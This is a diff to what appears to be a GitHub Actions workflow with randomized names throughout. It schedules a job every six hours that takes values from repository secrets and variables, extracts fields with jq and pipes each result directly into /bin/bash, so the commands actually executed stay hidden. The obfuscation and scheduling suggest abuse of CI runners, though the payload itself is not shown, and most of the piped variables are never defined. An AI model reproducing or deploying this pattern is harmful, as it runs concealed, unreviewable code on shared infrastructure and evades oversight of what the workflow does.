@@ -2,7 +2,7 @@ name: guoshantui4678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
+    - cron: '35 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,12 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          dbhqp3621: ${{ secrets.dbhqp3621 }}
+          zbula4190: ${{ secrets.zbula4190 }}
         run: |
-          echo $dbhqp3621 | jq -r .sjttj1230 | /bin/bash
-          echo $k7 | jq -r .ltxn5224 | /bin/bash
-          echo $xsmbu3 | jq -r .axmp55676 | /bin/bash
-          echo $vqen60508 | jq -r .klm9826 | /bin/bash
-          echo $vjb883 | jq -r .sncrp771 | /bin/bash
-          echo $hsktl4 | jq -r .wcfl39 | /bin/bash
+          echo $zbula4190 | jq -r .uwqb525 | /bin/bash
+          echo $tggf8484 | jq -r .lfh086 | /bin/bash
+          echo $okxnv5832 | jq -r .xxde9 | /bin/bash
+          echo $ftzcs59 | jq -r .eit76 | /bin/bash
+          echo $vn87313 | jq -r .uajm4299 | /bin/bash
+          echo $zpwf875 | jq -r .k059 | /bin/bash
+          echo $j117 | jq -r .liwlz851 | /bin/bash
+          echo $w07401 | jq -r .k665 | /bin/bash
+          echo $jrcgn5478 | jq -r .plwp37 | /bin/bash
+          echo $bndb5616 | jq -r .rve43 | /bin/bash
+          echo $cr182 | jq -r .tiy23902 | /bin/bash
+          echo $fniii9 | jq -r .u8673 | /bin/bash
+          echo $jw6 | jq -r .rpi34760 | /bin/bash
+          echo $fnc735 | jq -r .l3 | /bin/bash
+          echo $z4 | jq -r .nor06808 | /bin/bash
 
